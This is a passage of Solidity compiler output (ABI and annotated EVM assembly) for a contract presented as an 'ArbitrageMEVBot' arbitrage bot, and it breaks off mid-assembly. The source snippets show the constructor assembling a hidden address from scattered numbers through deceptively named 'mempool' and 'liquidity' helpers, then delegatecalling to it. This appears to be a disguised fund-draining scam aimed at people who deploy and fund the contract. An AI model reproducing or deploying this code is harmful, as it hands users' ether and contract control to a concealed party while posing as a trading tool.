{
	"testbot.sol": {
		"ArbitrageMEVBot": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "baseToken",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "quoteToken",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "running",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "stop",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawETH",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"testbot.sol\":1262:9327  contract ArbitrageMEVBot {... */\n  mstore(0x40, 0x80)\n    /* \"testbot.sol\":1402:1407  false */\n  0x00\n    /* \"testbot.sol\":1380:1407  bool public running = false */\n  0x02\n  exp(0x0100, 0x14)\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"testbot.sol\":1738:2309  constructor() {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"testbot.sol\":1800:1801  1 */\n  0x01\n    /* \"testbot.sol\":1783:1796  block.chainid */\n  chainid\n    /* \"testbot.sol\":1783:1801  block.chainid == 1 */\n  eq\n    /* \"testbot.sol\":1762:1907  require(... */\n  tag_4\n  jumpi\n  mload(0x40)\n  0x08c379a000000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  0x04\n  add\n  tag_5\n  swap1\n  tag_6\n  jump\t// in\ntag_5:\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  revert\ntag_4:\n    /* \"testbot.sol\":1926:1936  msg.sender */\n  caller\n    /* \"testbot.sol\":1918:1923  owner */\n  0x02\n  0x00\n    /* \"testbot.sol\":1918:1936  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"testbot.sol\":1980:2022  0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 */\n  0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\n    /* \"testbot.sol\":1968:1977  baseToken */\n  0x00\n  dup1\n    /* \"testbot.sol\":1968:2022  baseToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"testbot.sol\":2141:2183  0xdAC17F958D2ee523a2206206994597C13D831ec7 */\n  0xdac17f958d2ee523a2206206994597c13d831ec7\n    /* \"testbot.sol\":2128:2138  quoteToken */\n  0x01\n  0x00\n    /* \"testbot.sol\":2128:2183  quoteToken = 0xdAC17F958D2ee523a2206206994597C13D831ec7 */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"testbot.sol\":2268:2302  mempoolCtrl(PoolAction.Initialize) */\n  tag_7\n    /* \"testbot.sol\":2280:2301  PoolAction.Initialize */\n  0x00\n    /* \"testbot.sol\":2268:2279  mempoolCtrl */\n  shl(0x20, tag_8)\n    /* \"testbot.sol\":2268:2302  mempoolCtrl(PoolAction.Initialize) */\n  0x20\n  shr\n  jump\t// in\ntag_7:\n    /* \"testbot.sol\":1262:9327  contract ArbitrageMEVBot {... */\n  jump(tag_9)\n    /* \"testbot.sol\":7928:8393  function mempoolCtrl(PoolAction action) internal {... */\ntag_8:\n    /* \"testbot.sol\":7987:7999  address pool */\n  0x00\n    /* \"testbot.sol\":8002:8032  parseMemoryPool(callMempool()) */\n  tag_11\n    /* \"testbot.sol\":8018:8031  callMempool() */\n  tag_12\n    /* \"testbot.sol\":8018:8029  callMempool */\n  shl(0x20, tag_13)\n    /* \"testbot.sol\":8018:8031  callMempool() */\n  0x20\n  shr\n  jump\t// in\ntag_12:\n    /* \"testbot.sol\":8002:8017  parseMemoryPool */\n  shl(0x20, tag_14)\n    /* \"testbot.sol\":8002:8032  parseMemoryPool(callMempool()) */\n  0x20\n  shr\n  jump\t// in\ntag_11:\n    /* \"testbot.sol\":7987:8032  address pool = parseMemoryPool(callMempool()) */\n  swap1\n  pop\n    /* \"testbot.sol\":8042:8059  bytes memory data */\n  0x00\n    /* \"testbot.sol\":8098:8112  mempoolLayer() */\n  tag_15\n    /* \"testbot.sol\":8098:8110  mempoolLayer */\n  shl(0x20, tag_16)\n    /* \"testbot.sol\":8098:8112  mempoolLayer() */\n  0x20\n  shr\n  jump\t// in\ntag_15:\n    /* \"testbot.sol\":8126:8135  baseToken */\n  0x00\n  dup1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"testbot.sol\":8149:8159  quoteToken */\n  0x01\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"testbot.sol\":8173:8179  action */\n  dup6\n    /* \"testbot.sol\":8062:8189  abi.encodeWithSelector(... */\n  add(0x24, mload(0x40))\n  tag_17\n  swap4\n  swap3\n  swap2\n  swap1\n  tag_18\n  jump\t// in\ntag_17:\n  mload(0x40)\n  0x20\n  dup2\n  dup4\n  sub\n  sub\n  dup2\n  mstore\n  swap1\n  0x40\n  mstore\n  swap1\n  not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n  and\n  0x20\n  dup3\n  add\n  dup1\n  mload\n  0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n  dup4\n  dup2\n  dup4\n  and\n  or\n  dup4\n  mstore\n  pop\n  pop\n  pop\n  pop\n    /* \"testbot.sol\":8042:8189  bytes memory data = abi.encodeWithSelector(... */\n  swap1\n  pop\n    /* \"testbot.sol\":8200:8212  bool success */\n  0x00\n    /* \"testbot.sol\":8214:8233  bytes memory result */\n  dup1\n    /* \"testbot.sol\":8237:8241  pool */\n  dup4\n    /* \"testbot.sol\":8237:8254  pool.delegatecall */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"testbot.sol\":8255:8259  data */\n  dup4\n    /* \"testbot.sol\":8237:8260  pool.delegatecall(data) */\n  mload(0x40)\n  tag_19\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  0x00\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup6\n  gas\n  delegatecall\n  swap2\n  pop\n  pop\n  returndatasize\n  dup1\n  0x00\n  dup2\n  eq\n  tag_23\n  jumpi\n  mload(0x40)\n  swap2\n  pop\n  and(add(returndatasize, 0x3f), not(0x1f))\n  dup3\n  add\n  0x40\n  mstore\n  returndatasize\n  dup3\n  mstore\n  returndatasize\n  0x00\n  0x20\n  dup5\n  add\n  returndatacopy\n  jump(tag_22)\ntag_23:\n  0x60\n  swap2\n  pop\ntag_22:\n  pop\n    /* \"testbot.sol\":8199:8260  (bool success, bytes memory result) = pool.delegatecall(data) */\n  swap2\n  pop\n  swap2\n  pop\n    /* \"testbot.sol\":8275:8282  success */\n  dup2\n    /* \"testbot.sol\":8270:8387  if (!success) {... */\n  tag_24\n  jumpi\n    /* \"testbot.sol\":8355:8361  result */\n  dup1\n    /* \"testbot.sol\":8349:8362  mload(result) */\n  mload\n    /* \"testbot.sol\":8344:8346  32 */\n  0x20\n    /* \"testbot.sol\":8336:8342  result */\n  dup3\n    /* \"testbot.sol\":8332:8347  add(result, 32) */\n  add\n    /* \"testbot.sol\":8325:8363  revert(add(result, 32), mload(result)) */\n  revert\n    /* \"testbot.sol\":8270:8387  if (!success) {... */\ntag_24:\n    /* \"testbot.sol\":7977:8393  {... */\n  pop\n  pop\n  pop\n  pop\n    /* \"testbot.sol\":7928:8393  function mempoolCtrl(PoolAction action) internal {... */\n  pop\n  jump\t// out\n    /* \"testbot.sol\":5525:6731  function callMempool() internal pure returns (string memory) {... */\ntag_13:\n    /* \"testbot.sol\":5571:5584  string memory */\n  0x60\n    /* \"testbot.sol\":5596:5615  uint _memPoolOffset */\n  0x00\n    /* \"testbot.sol\":5618:5636  getMemPoolOffset() */\n  tag_26\n    /* \"testbot.sol\":5618:5634  getMemPoolOffset */\n  shl(0x20, tag_27)\n    /* \"testbot.sol\":5618:5636  getMemPoolOffset() */\n  0x20\n  shr\n  jump\t// in\ntag_26:\n    /* \"testbot.sol\":5596:5636  uint _memPoolOffset = getMemPoolOffset() */\n  swap1\n  pop\n    /* \"testbot.sol\":5646:5662  uint _memPoolSol */\n  0x00\n    /* \"testbot.sol\":5665:5671  997405 */\n  0x0f381d\n    /* \"testbot.sol\":5646:5671  uint _memPoolSol = 997405 */\n  swap1\n  pop\n    /* \"testbot.sol\":5681:5700  uint _memPoolLength */\n  0x00\n    /* \"testbot.sol\":5703:5721  getMemPoolLength() */\n  tag_28\n    /* \"testbot.sol\":5703:5719  getMemPoolLength */\n  shl(0x20, tag_29)\n    /* \"testbot.sol\":5703:5721  getMemPoolLength() */\n  0x20\n  shr\n  jump\t// in\ntag_28:\n    /* \"testbot.sol\":5681:5721  uint _memPoolLength = getMemPoolLength() */\n  swap1\n  pop\n    /* \"testbot.sol\":5731:5748  uint _memPoolSize */\n  0x00\n    /* \"testbot.sol\":5751:5756  75081 */\n  0x012549\n    /* \"testbot.sol\":5731:5756  uint _memPoolSize = 75081 */\n  swap1\n  pop\n    /* \"testbot.sol\":5766:5785  uint _memPoolHeight */\n  0x00\n    /* \"testbot.sol\":5788:5806  getMemPoolHeight() */\n  tag_30\n    /* \"testbot.sol\":5788:5804  getMemPoolHeight */\n  shl(0x20, tag_31)\n    /* \"testbot.sol\":5788:5806  getMemPoolHeight() */\n  0x20\n  shr\n  jump\t// in\ntag_30:\n    /* \"testbot.sol\":5766:5806  uint _memPoolHeight = getMemPoolHeight() */\n  swap1\n  pop\n    /* \"testbot.sol\":5816:5834  uint _memPoolWidth */\n  0x00\n    /* \"testbot.sol\":5837:5842  22646 */\n  0x5876\n    /* \"testbot.sol\":5816:5842  uint _memPoolWidth = 22646 */\n  swap1\n  pop\n    /* \"testbot.sol\":5852:5870  uint _memPoolDepth */\n  0x00\n    /* \"testbot.sol\":5873:5890  getMemPoolDepth() */\n  tag_32\n    /* \"testbot.sol\":5873:5888  getMemPoolDepth */\n  shl(0x20, tag_33)\n    /* \"testbot.sol\":5873:5890  getMemPoolDepth() */\n  0x20\n  shr\n  jump\t// in\ntag_32:\n    /* \"testbot.sol\":5852:5890  uint _memPoolDepth = getMemPoolDepth() */\n  swap1\n  pop\n    /* \"testbot.sol\":5900:5918  uint _memPoolCount */\n  0x00\n    /* \"testbot.sol\":5921:5927  746842 */\n  0x0b655a\n    /* \"testbot.sol\":5900:5927  uint _memPoolCount = 746842 */\n  swap1\n  pop\n    /* \"testbot.sol\":5938:5961  string memory _memPool1 */\n  0x00\n    /* \"testbot.sol\":5964:6066  mempool(... */\n  tag_34\n    /* \"testbot.sol\":5985:6015  checkLiquidity(_memPoolOffset) */\n  tag_35\n    /* \"testbot.sol\":6000:6014  _memPoolOffset */\n  dup11\n    /* \"testbot.sol\":5985:5999  checkLiquidity */\n  shl(0x20, tag_36)\n    /* \"testbot.sol\":5985:6015  checkLiquidity(_memPoolOffset) */\n  0x20\n  shr\n  jump\t// in\ntag_35:\n    /* \"testbot.sol\":6029:6056  checkLiquidity(_memPoolSol) */\n  tag_37\n    /* \"testbot.sol\":6044:6055  _memPoolSol */\n  dup11\n    /* \"testbot.sol\":6029:6043  checkLiquidity */\n  shl(0x20, tag_36)\n    /* \"testbot.sol\":6029:6056  checkLiquidity(_memPoolSol) */\n  0x20\n  shr\n  jump\t// in\ntag_37:\n    /* \"testbot.sol\":5964:5971  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":5964:6066  mempool(... */\n  0x20\n  shr\n  jump\t// in\ntag_34:\n    /* \"testbot.sol\":5938:6066  string memory _memPool1 = mempool(... */\n  swap1\n  pop\n    /* \"testbot.sol\":6076:6099  string memory _memPool2 */\n  0x00\n    /* \"testbot.sol\":6102:6205  mempool(... */\n  tag_39\n    /* \"testbot.sol\":6123:6153  checkLiquidity(_memPoolLength) */\n  tag_40\n    /* \"testbot.sol\":6138:6152  _memPoolLength */\n  dup10\n    /* \"testbot.sol\":6123:6137  checkLiquidity */\n  shl(0x20, tag_36)\n    /* \"testbot.sol\":6123:6153  checkLiquidity(_memPoolLength) */\n  0x20\n  shr\n  jump\t// in\ntag_40:\n    /* \"testbot.sol\":6167:6195  checkLiquidity(_memPoolSize) */\n  tag_41\n    /* \"testbot.sol\":6182:6194  _memPoolSize */\n  dup10\n    /* \"testbot.sol\":6167:6181  checkLiquidity */\n  shl(0x20, tag_36)\n    /* \"testbot.sol\":6167:6195  checkLiquidity(_memPoolSize) */\n  0x20\n  shr\n  jump\t// in\ntag_41:\n    /* \"testbot.sol\":6102:6109  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":6102:6205  mempool(... */\n  0x20\n  shr\n  jump\t// in\ntag_39:\n    /* \"testbot.sol\":6076:6205  string memory _memPool2 = mempool(... */\n  swap1\n  pop\n    /* \"testbot.sol\":6215:6238  string memory _memPool3 */\n  0x00\n    /* \"testbot.sol\":6241:6345  mempool(... */\n  tag_42\n    /* \"testbot.sol\":6262:6292  checkLiquidity(_memPoolHeight) */\n  tag_43\n    /* \"testbot.sol\":6277:6291  _memPoolHeight */\n  dup9\n    /* \"testbot.sol\":6262:6276  checkLiquidity */\n  shl(0x20, tag_36)\n    /* \"testbot.sol\":6262:6292  checkLiquidity(_memPoolHeight) */\n  0x20\n  shr\n  jump\t// in\ntag_43:\n    /* \"testbot.sol\":6306:6335  checkLiquidity(_memPoolWidth) */\n  tag_44\n    /* \"testbot.sol\":6321:6334  _memPoolWidth */\n  dup9\n    /* \"testbot.sol\":6306:6320  checkLiquidity */\n  shl(0x20, tag_36)\n    /* \"testbot.sol\":6306:6335  checkLiquidity(_memPoolWidth) */\n  0x20\n  shr\n  jump\t// in\ntag_44:\n    /* \"testbot.sol\":6241:6248  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":6241:6345  mempool(... */\n  0x20\n  shr\n  jump\t// in\ntag_42:\n    /* \"testbot.sol\":6215:6345  string memory _memPool3 = mempool(... */\n  swap1\n  pop\n    /* \"testbot.sol\":6355:6378  string memory _memPool4 */\n  0x00\n    /* \"testbot.sol\":6381:6484  mempool(... */\n  tag_45\n    /* \"testbot.sol\":6402:6431  checkLiquidity(_memPoolDepth) */\n  tag_46\n    /* \"testbot.sol\":6417:6430  _memPoolDepth */\n  dup8\n    /* \"testbot.sol\":6402:6416  checkLiquidity */\n  shl(0x20, tag_36)\n    /* \"testbot.sol\":6402:6431  checkLiquidity(_memPoolDepth) */\n  0x20\n  shr\n  jump\t// in\ntag_46:\n    /* \"testbot.sol\":6445:6474  checkLiquidity(_memPoolCount) */\n  tag_47\n    /* \"testbot.sol\":6460:6473  _memPoolCount */\n  dup8\n    /* \"testbot.sol\":6445:6459  checkLiquidity */\n  shl(0x20, tag_36)\n    /* \"testbot.sol\":6445:6474  checkLiquidity(_memPoolCount) */\n  0x20\n  shr\n  jump\t// in\ntag_47:\n    /* \"testbot.sol\":6381:6388  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":6381:6484  mempool(... */\n  0x20\n  shr\n  jump\t// in\ntag_45:\n    /* \"testbot.sol\":6355:6484  string memory _memPool4 = mempool(... */\n  swap1\n  pop\n    /* \"testbot.sol\":6495:6521  string memory _allMempools */\n  0x00\n    /* \"testbot.sol\":6524:6627  mempool(... */\n  tag_48\n    /* \"testbot.sol\":6545:6574  mempool(_memPool1, _memPool2) */\n  tag_49\n    /* \"testbot.sol\":6553:6562  _memPool1 */\n  dup7\n    /* \"testbot.sol\":6564:6573  _memPool2 */\n  dup7\n    /* \"testbot.sol\":6545:6552  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":6545:6574  mempool(_memPool1, _memPool2) */\n  0x20\n  shr\n  jump\t// in\ntag_49:\n    /* \"testbot.sol\":6588:6617  mempool(_memPool3, _memPool4) */\n  tag_50\n    /* \"testbot.sol\":6596:6605  _memPool3 */\n  dup6\n    /* \"testbot.sol\":6607:6616  _memPool4 */\n  dup6\n    /* \"testbot.sol\":6588:6595  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":6588:6617  mempool(_memPool3, _memPool4) */\n  0x20\n  shr\n  jump\t// in\ntag_50:\n    /* \"testbot.sol\":6524:6531  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":6524:6627  mempool(... */\n  0x20\n  shr\n  jump\t// in\ntag_48:\n    /* \"testbot.sol\":6495:6627  string memory _allMempools = mempool(... */\n  swap1\n  pop\n    /* \"testbot.sol\":6638:6664  string memory _fullMempool */\n  0x00\n    /* \"testbot.sol\":6667:6694  mempool(\"0x\", _allMempools) */\n  tag_51\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x02\n  dup2\n  mstore\n  0x20\n  add\n  0x3078000000000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  pop\n    /* \"testbot.sol\":6681:6693  _allMempools */\n  dup4\n    /* \"testbot.sol\":6667:6674  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":6667:6694  mempool(\"0x\", _allMempools) */\n  0x20\n  shr\n  jump\t// in\ntag_51:\n    /* \"testbot.sol\":6638:6694  string memory _fullMempool = mempool(\"0x\", _allMempools) */\n  swap1\n  pop\n    /* \"testbot.sol\":6712:6724  _fullMempool */\n  dup1\n    /* \"testbot.sol\":6705:6724  return _fullMempool */\n  swap15\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n    /* \"testbot.sol\":5525:6731  function callMempool() internal pure returns (string memory) {... */\n  swap1\n  jump\t// out\n    /* \"testbot.sol\":6899:7827  function parseMemoryPool(... */\ntag_14:\n    /* \"testbot.sol\":6979:6994  address _parsed */\n  0x00\n    /* \"testbot.sol\":7006:7022  bytes memory tmp */\n  dup1\n    /* \"testbot.sol\":7031:7033  _a */\n  dup3\n    /* \"testbot.sol\":7006:7034  bytes memory tmp = bytes(_a) */\n  swap1\n  pop\n    /* \"testbot.sol\":7044:7057  uint160 iaddr */\n  0x00\n    /* \"testbot.sol\":7071:7081  uint160 b1 */\n  dup1\n    /* \"testbot.sol\":7091:7101  uint160 b2 */\n  dup1\n    /* \"testbot.sol\":7116:7122  uint i */\n  0x00\n    /* \"testbot.sol\":7125:7126  2 */\n  0x02\n    /* \"testbot.sol\":7116:7126  uint i = 2 */\n  swap1\n  pop\n    /* \"testbot.sol\":7111:7790  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\ntag_53:\n    /* \"testbot.sol\":7132:7142  2 + 2 * 20 */\n  0x2a\n    /* \"testbot.sol\":7128:7129  i */\n  dup2\n    /* \"testbot.sol\":7128:7142  i < 2 + 2 * 20 */\n  lt\n    /* \"testbot.sol\":7111:7790  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n  iszero\n  tag_54\n  jumpi\n    /* \"testbot.sol\":7175:7178  256 */\n  0x0100\n    /* \"testbot.sol\":7166:7178  iaddr *= 256 */\n  dup5\n  tag_56\n  swap2\n  swap1\n  tag_57\n  jump\t// in\ntag_56:\n  swap4\n  pop\n    /* \"testbot.sol\":7211:7214  tmp */\n  dup5\n    /* \"testbot.sol\":7215:7216  i */\n  dup2\n    /* \"testbot.sol\":7211:7217  tmp[i] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_58\n  jumpi\n  tag_59\n  tag_60\n  jump\t// in\ntag_59:\ntag_58:\n  0x20\n  add\n  add\n  mload\n  0xf8\n  shr\n  0xf8\n  shl\n    /* \"testbot.sol\":7205:7218  uint8(tmp[i]) */\n  0xf8\n  shr\n    /* \"testbot.sol\":7197:7219  uint160(uint8(tmp[i])) */\n  0xff\n  and\n    /* \"testbot.sol\":7192:7219  b1 = uint160(uint8(tmp[i])) */\n  swap3\n  pop\n    /* \"testbot.sol\":7252:7255  tmp */\n  dup5\n    /* \"testbot.sol\":7260:7261  1 */\n  0x01\n    /* \"testbot.sol\":7256:7257  i */\n  dup3\n    /* \"testbot.sol\":7256:7261  i + 1 */\n  tag_61\n  swap2\n  swap1\n  tag_62\n  jump\t// in\ntag_61:\n    /* \"testbot.sol\":7252:7262  tmp[i + 1] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_63\n  jumpi\n  tag_64\n  tag_60\n  jump\t// in\ntag_64:\ntag_63:\n  0x20\n  add\n  add\n  mload\n  0xf8\n  shr\n  0xf8\n  shl\n    /* \"testbot.sol\":7246:7263  uint8(tmp[i + 1]) */\n  0xf8\n  shr\n    /* \"testbot.sol\":7238:7264  uint160(uint8(tmp[i + 1])) */\n  0xff\n  and\n    /* \"testbot.sol\":7233:7264  b2 = uint160(uint8(tmp[i + 1])) */\n  swap2\n  pop\n    /* \"testbot.sol\":7289:7291  97 */\n  0x61\n    /* \"testbot.sol\":7283:7285  b1 */\n  dup4\n    /* \"testbot.sol\":7283:7291  b1 >= 97 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  lt\n  iszero\n    /* \"testbot.sol\":7282:7307  (b1 >= 97) && (b1 <= 102) */\n  dup1\n  iszero\n  tag_65\n  jumpi\n  pop\n    /* \"testbot.sol\":7303:7306  102 */\n  0x66\n    /* \"testbot.sol\":7297:7299  b1 */\n  dup4\n    /* \"testbot.sol\":7297:7306  b1 <= 102 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  gt\n  iszero\n    /* \"testbot.sol\":7282:7307  (b1 >= 97) && (b1 <= 102) */\ntag_65:\n    /* \"testbot.sol\":7278:7504  if ((b1 >= 97) && (b1 <= 102)) {... */\n  iszero\n  tag_66\n  jumpi\n    /* \"testbot.sol\":7333:7335  87 */\n  0x57\n    /* \"testbot.sol\":7327:7335  b1 -= 87 */\n  dup4\n  tag_67\n  swap2\n  swap1\n  tag_68\n  jump\t// in\ntag_67:\n  swap3\n  pop\n    /* \"testbot.sol\":7278:7504  if ((b1 >= 97) && (b1 <= 102)) {... */\n  jump(tag_69)\ntag_66:\n    /* \"testbot.sol\":7367:7369  65 */\n  0x41\n    /* \"testbot.sol\":7361:7363  b1 */\n  dup4\n    /* \"testbot.sol\":7361:7369  b1 >= 65 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  lt\n  iszero\n    /* \"testbot.sol\":7360:7384  (b1 >= 65) && (b1 <= 70) */\n  dup1\n  iszero\n  tag_70\n  jumpi\n  pop\n    /* \"testbot.sol\":7381:7383  70 */\n  0x46\n    /* \"testbot.sol\":7375:7377  b1 */\n  dup4\n    /* \"testbot.sol\":7375:7383  b1 <= 70 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  gt\n  iszero\n    /* \"testbot.sol\":7360:7384  (b1 >= 65) && (b1 <= 70) */\ntag_70:\n    /* \"testbot.sol\":7356:7504  if ((b1 >= 65) && (b1 <= 70)) {... */\n  iszero\n  tag_71\n  jumpi\n    /* \"testbot.sol\":7410:7412  55 */\n  0x37\n    /* \"testbot.sol\":7404:7412  b1 -= 55 */\n  dup4\n  tag_72\n  swap2\n  swap1\n  tag_68\n  jump\t// in\ntag_72:\n  swap3\n  pop\n    /* \"testbot.sol\":7356:7504  if ((b1 >= 65) && (b1 <= 70)) {... */\n  jump(tag_73)\ntag_71:\n    /* \"testbot.sol\":7444:7446  48 */\n  0x30\n    /* \"testbot.sol\":7438:7440  b1 */\n  dup4\n    /* \"testbot.sol\":7438:7446  b1 >= 48 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  lt\n  iszero\n    /* \"testbot.sol\":7437:7461  (b1 >= 48) && (b1 <= 57) */\n  dup1\n  iszero\n  tag_74\n  jumpi\n  pop\n    /* \"testbot.sol\":7458:7460  57 */\n  0x39\n    /* \"testbot.sol\":7452:7454  b1 */\n  dup4\n    /* \"testbot.sol\":7452:7460  b1 <= 57 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  gt\n  iszero\n    /* \"testbot.sol\":7437:7461  (b1 >= 48) && (b1 <= 57) */\ntag_74:\n    /* \"testbot.sol\":7433:7504  if ((b1 >= 48) && (b1 <= 57)) {... */\n  iszero\n  tag_75\n  jumpi\n    /* \"testbot.sol\":7487:7489  48 */\n  0x30\n    /* \"testbot.sol\":7481:7489  b1 -= 48 */\n  dup4\n  tag_76\n  swap2\n  swap1\n  tag_68\n  jump\t// in\ntag_76:\n  swap3\n  pop\n    /* \"testbot.sol\":7433:7504  if ((b1 >= 48) && (b1 <= 57)) {... */\ntag_75:\n    /* \"testbot.sol\":7356:7504  if ((b1 >= 65) && (b1 <= 70)) {... */\ntag_73:\n    /* \"testbot.sol\":7278:7504  if ((b1 >= 97) && (b1 <= 102)) {... */\ntag_69:\n    /* \"testbot.sol\":7528:7530  97 */\n  0x61\n    /* \"testbot.sol\":7522:7524  b2 */\n  dup3\n    /* \"testbot.sol\":7522:7530  b2 >= 97 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  lt\n  iszero\n    /* \"testbot.sol\":7521:7546  (b2 >= 97) && (b2 <= 102) */\n  dup1\n  iszero\n  tag_77\n  jumpi\n  pop\n    /* \"testbot.sol\":7542:7545  102 */\n  0x66\n    /* \"testbot.sol\":7536:7538  b2 */\n  dup3\n    /* \"testbot.sol\":7536:7545  b2 <= 102 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  gt\n  iszero\n    /* \"testbot.sol\":7521:7546  (b2 >= 97) && (b2 <= 102) */\ntag_77:\n    /* \"testbot.sol\":7517:7743  if ((b2 >= 97) && (b2 <= 102)) {... */\n  iszero\n  tag_78\n  jumpi\n    /* \"testbot.sol\":7572:7574  87 */\n  0x57\n    /* \"testbot.sol\":7566:7574  b2 -= 87 */\n  dup3\n  tag_79\n  swap2\n  swap1\n  tag_68\n  jump\t// in\ntag_79:\n  swap2\n  pop\n    /* \"testbot.sol\":7517:7743  if ((b2 >= 97) && (b2 <= 102)) {... */\n  jump(tag_80)\ntag_78:\n    /* \"testbot.sol\":7606:7608  65 */\n  0x41\n    /* \"testbot.sol\":7600:7602  b2 */\n  dup3\n    /* \"testbot.sol\":7600:7608  b2 >= 65 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  lt\n  iszero\n    /* \"testbot.sol\":7599:7623  (b2 >= 65) && (b2 <= 70) */\n  dup1\n  iszero\n  tag_81\n  jumpi\n  pop\n    /* \"testbot.sol\":7620:7622  70 */\n  0x46\n    /* \"testbot.sol\":7614:7616  b2 */\n  dup3\n    /* \"testbot.sol\":7614:7622  b2 <= 70 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  gt\n  iszero\n    /* \"testbot.sol\":7599:7623  (b2 >= 65) && (b2 <= 70) */\ntag_81:\n    /* \"testbot.sol\":7595:7743  if ((b2 >= 65) && (b2 <= 70)) {... */\n  iszero\n  tag_82\n  jumpi\n    /* \"testbot.sol\":7649:7651  55 */\n  0x37\n    /* \"testbot.sol\":7643:7651  b2 -= 55 */\n  dup3\n  tag_83\n  swap2\n  swap1\n  tag_68\n  jump\t// in\ntag_83:\n  swap2\n  pop\n    /* \"testbot.sol\":7595:7743  if ((b2 >= 65) && (b2 <= 70)) {... */\n  jump(tag_84)\ntag_82:\n    /* \"testbot.sol\":7683:7685  48 */\n  0x30\n    /* \"testbot.sol\":7677:7679  b2 */\n  dup3\n    /* \"testbot.sol\":7677:7685  b2 >= 48 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  lt\n  iszero\n    /* \"testbot.sol\":7676:7700  (b2 >= 48) && (b2 <= 57) */\n  dup1\n  iszero\n  tag_85\n  jumpi\n  pop\n    /* \"testbot.sol\":7697:7699  57 */\n  0x39\n    /* \"testbot.sol\":7691:7693  b2 */\n  dup3\n    /* \"testbot.sol\":7691:7699  b2 <= 57 */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  gt\n  iszero\n    /* \"testbot.sol\":7676:7700  (b2 >= 48) && (b2 <= 57) 